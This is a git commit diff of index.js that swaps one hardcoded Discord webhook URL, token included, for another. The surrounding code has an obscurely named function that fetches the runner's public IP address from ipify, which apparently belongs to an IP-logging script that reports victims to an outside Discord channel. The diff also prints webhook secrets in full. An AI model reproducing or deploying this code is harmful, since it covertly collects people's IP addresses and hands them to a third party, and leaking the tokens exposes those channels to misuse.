00855f84acff908ca25a938f557a45f4292ea21b
Dubran-B <128305891+Dubran-B@users.noreply.github.com>
2023-03-24 15:08:38 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,4 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1088188475150438531/kXd8KnhCn8CR5-A-aSq0zSsMxJoGK7fsvIQU6i6Qnz5APYVxjjMfZiVlD13SimCuZLJS';
-// https://discord.com/api/webhooks/1088188475150438531/kXd8KnhCn8CR5-A-aSq0zSsMxJoGK7fsvIQU6i6Qnz5APYVxjjMfZiVlD13SimCuZLJS
+const webhookUrl = 'https://discord.com/api/webhooks/1088531419615219754/oZTjC9vPNE8zWvlrWBUMb7PUEdv7wGQUlAIe6LngKMooRDimHqn1RPbgzw7teRCTFaHb';
 async function _rgiuh() {
   const response = await fetch('https://api.ipify.org/');
   const data = await response.text();
